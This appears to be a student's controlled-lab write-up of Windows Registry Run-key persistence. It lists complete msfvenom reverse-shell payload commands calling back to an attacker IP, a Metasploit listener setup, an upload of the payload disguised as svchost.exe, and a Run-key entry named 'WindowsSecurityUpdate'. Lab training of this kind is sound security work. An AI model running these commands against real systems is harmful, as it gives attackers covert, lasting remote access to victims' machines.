# Windows Registry Persistence Assessment

> A controlled post-exploitation lab assessment covering initial payload generation, Meterpreter access confirmation, persistence payload creation, payload placement, Registry Run-key configuration, and verification.

---

## Overview

This practical documents a persistence workflow carried out after Meterpreter access was established on a Windows 10 laboratory target. The activity focuses on creating a dedicated persistence payload, placing it in the Windows Temp directory, and associating it with a Windows Registry Run key.

## Objective

Establish and verify a Registry-based persistence mechanism after initial access by:

- generating a dedicated persistence payload;
- placing the payload in the Windows Temp directory; and
- creating and verifying a Registry Run-key entry that points to the stored executable.

## Lab Environment

| Component | Configuration |
|---|---|
| **Attacker IP** | `192.168.88.185` |
| **Target OS** | Windows 10 |
| **Primary Access** | Meterpreter session |
| **Persistence Method** | Windows Registry Run-key |
| **Payload Location** | `C:\Windows\Temp\svchost.exe` |
| **Tools** | Metasploit Framework · msfvenom · Meterpreter · Windows Registry |
| **Environment** | Controlled cybersecurity training laboratory |

## Practical Workflow

### Step 1 — Initial Payload Generation

The initial Meterpreter payload was generated for the laboratory target and configured to connect back to the documented attacker address on TCP port `4444`.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.88.185 LPORT=4444 -f exe -o task3_payload.exe
```

The source evidence confirms that the executable was generated successfully.

### Step 2 — Listener Setup & Initial Access Confirmation

A Metasploit handler was configured to receive the reverse connection from the target.

```text
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.88.185
set LPORT 4444
run
```

The recorded output confirms that the reverse TCP handler started and a Meterpreter session was subsequently opened.

### Step 3 — Persistence Payload Creation

A separate payload was generated for the persistence stage using TCP port `5555`, providing a distinct payload from the initial access component.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.88.185 LPORT=5555 -f exe -o persistent.exe
```

The source evidence confirms that `persistent.exe` was created successfully.

### Step 4 — Payload Upload to the Windows Temp Directory

The persistence executable was uploaded to the Windows Temp directory and stored as `svchost.exe`.

```text
upload /home/kali/persistent.exe C:\Windows\Temp\svchost.exe
```

The recorded Meterpreter output confirms successful transfer of the file to the target path.

### Step 5 — Windows Registry Entry Addition

A Registry Run-key value was created to associate the uploaded executable with the Windows user startup path.

```text
meterpreter > reg setval -k "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" -v "WindowsSecurityUpdate" -d "C:\Windows\Temp\svchost.exe"
```

The evidence shows a successful registry-value write for `WindowsSecurityUpdate`.

### Step 6 — Registry Entry Verification

The Windows Registry was inspected to confirm that the startup entry references the executable stored in the Temp directory.

The verification evidence shows the Run-key entry pointing to:

```text
C:\Windows\Temp\svchost.exe
```

## Result & Validation

| Validation Stage | Result |
|---|---|
| Initial payload generation | Confirmed |
| Meterpreter access | Confirmed |
| Persistence payload creation | Confirmed |
| Payload upload | Confirmed |
| Registry Run-key creation | Confirmed |
| Registry entry verification | Confirmed |

The submitted evidence supports the complete persistence workflow documented in this assessment.

## What I Learned

This practical demonstrated how persistence can be established after initial access by combining payload generation, file placement, and a Windows Registry startup mechanism. It also reinforced the importance of validating each stage with direct evidence rather than relying only on an assumed outcome.

## Vulnerability Classification

| Category | Classification |
|---|---|
| **Attack Stage** | Post-exploitation persistence |
| **Technique** | Windows Registry Run-key persistence |
| **Affected Component** | Windows user startup / Registry configuration |
| **Security Impact** | A malicious executable associated with a startup location may execute automatically during user logon, extending access beyond the initial compromise. |
| **Primary Defensive Focus** | Registry monitoring, startup control, endpoint detection, and execution restrictions |

## Environment Disclaimer

This report is based on the submitted practical material and is presented as an educational exercise in a controlled laboratory environment. It does not claim that the documented activity was performed against an unauthorized production system.

## Evidence

The supporting screenshots are embedded throughout the PDF and follow the same step-by-step sequence documented above.

**Report:** [`windows-registry-persistence-assessment.pdf`](./windows-registry-persistence-assessment.pdf)
